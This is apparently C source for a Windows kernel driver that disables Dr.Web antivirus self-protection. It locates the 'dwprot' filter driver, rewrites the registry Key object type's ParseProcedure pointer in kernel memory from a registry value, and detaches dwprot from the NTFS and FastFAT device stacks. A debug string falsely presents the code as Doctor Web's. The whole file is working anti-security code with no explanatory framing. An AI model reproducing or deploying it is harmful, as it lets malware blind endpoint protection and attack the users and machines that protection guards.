#include ".\nulldrv\defines.h"
#include ".\nulldrv\ntoskrnl.h"
#include ".\nulldrv\hal.h"
#include ".\nulldrv\rtl.h"
#include ".\nulldrv\ldasm.h"

PDRIVER_OBJECT 
NTAPI
IoGetDriverObjectByName(
	IN PWSTR DriverLink
	)
{
	UNICODE_STRING DriverObjectName;
	PDRIVER_OBJECT drv1 = NULL;
	NTSTATUS       Status;

//	DbgPrint("[~] Getting DriverObjectByName : %ws", DriverLink);
	
	RtlInitUnicodeString(&DriverObjectName, DriverLink);
	Status = ObReferenceObjectByName(&DriverObjectName, FILE_ATTRIBUTE_DEVICE, 0, 
		OBJ_CASE_INSENSITIVE, IoDriverObjectType, KernelMode, 0, (PVOID *)&drv1);
	if (NT_SUCCESS(Status))
	{	
		ObfDereferenceObject(drv1);
	}
//	DbgPrint("[~] Result of operation %lx", Status);
	return drv1;
}

VOID DetachFilter2(PDRIVER_OBJECT drvobj, PDRIVER_OBJECT DwProt)
{
	PDEVICE_OBJECT Prev, DeviceObject = NULL;

	Prev = DeviceObject;
	DeviceObject = drvobj->DeviceObject;

	while (DeviceObject)
	{
		//DbgPrint("DevObj %lx", DeviceObject);
		if (DeviceObject->DriverObject == DwProt)
		{
		//	DbgPrint("Gotcha");
			if (Prev) IoDetachDevice(Prev);
		}
		Prev = DeviceObject;
		DeviceObject = DeviceObject->AttachedDevice;	
	}
}

#define FILESYSTEM  L"\\FileSystem\\"
#define DWPROT      L"dwprot"
#define NTFS        L"ntfs"
#define FASTFAT		L"fastfat"

WCHAR textbuf[MAX_PATH];


VOID NTAPI DetachFilter(PUNICODE_STRING RegistryPath)
{
	HANDLE hKey;
	PVOID KeyObj = NULL;
	NTSTATUS Status;
	POBJECT_TYPE KeyType = NULL;
	PDRIVER_OBJECT drvobj;
	PDRIVER_OBJECT DwProt;
	OBJECT_ATTRIBUTES attr;
	UNICODE_STRING uStr;
	PVOID ParseProcedureValue;

	drvobj = DwProt = NULL;
	ParseProcedureValue = NULL;

	RtlZeroMemory(textbuf, sizeof(textbuf));

	strcpyW(textbuf, FILESYSTEM);
	strcatW(textbuf, DWPROT);

	DwProt = IoGetDriverObjectByName(textbuf);
	if (!DwProt) return;

	strcpyW(textbuf, RegistryPath->Buffer);
	RtlInitUnicodeString(&uStr, textbuf);
	InitializeObjectAttributes(&attr, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = ZwOpenKey(&hKey, KEY_ALL_ACCESS, &attr);
	if ( NT_SUCCESS(Status) )
	{
		ParseProcedureValue = (PVOID)RegReadInteger(hKey, L"Parse");
		if (ParseProcedureValue > MmSystemRangeStart && ParseProcedureValue != (PVOID)0xFFFFFFFF)
		{
			Status = ObReferenceObjectByHandle( hKey, 0, NULL, KernelMode, &KeyObj, NULL);
			if (NT_SUCCESS(Status))
			{
				KeyType = ((POBJECT_HEADER) ( POBJECT_TYPE ( (PBYTE)KeyObj - 0x18) ) )->ObjectType;
				ObfDereferenceObject(KeyObj);

				LOCK_SYSTEM();
				
				KeyType->TypeInfo.ParseProcedure = ParseProcedureValue;

				UNLOCK_SYSTEM();
			}
		}
		ZwClose(hKey);
	}


	strcpyW(textbuf, FILESYSTEM);
	strcatW(textbuf, NTFS);

	drvobj = IoGetDriverObjectByName(textbuf);
	if (drvobj) {
		DetachFilter2(drvobj, DwProt);
	}

	strcpyW(textbuf, FILESYSTEM);
	strcatW(textbuf, FASTFAT);

	drvobj = IoGetDriverObjectByName(textbuf);
	if (drvobj) {
		DetachFilter2(drvobj, DwProt);
	}
}

NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	__asm
	{
		nop
	}
	DbgPrint("Doctor Web © 2003 — 2010");
	DetachFilter(RegistryPath);

	return 0xC0000189;
}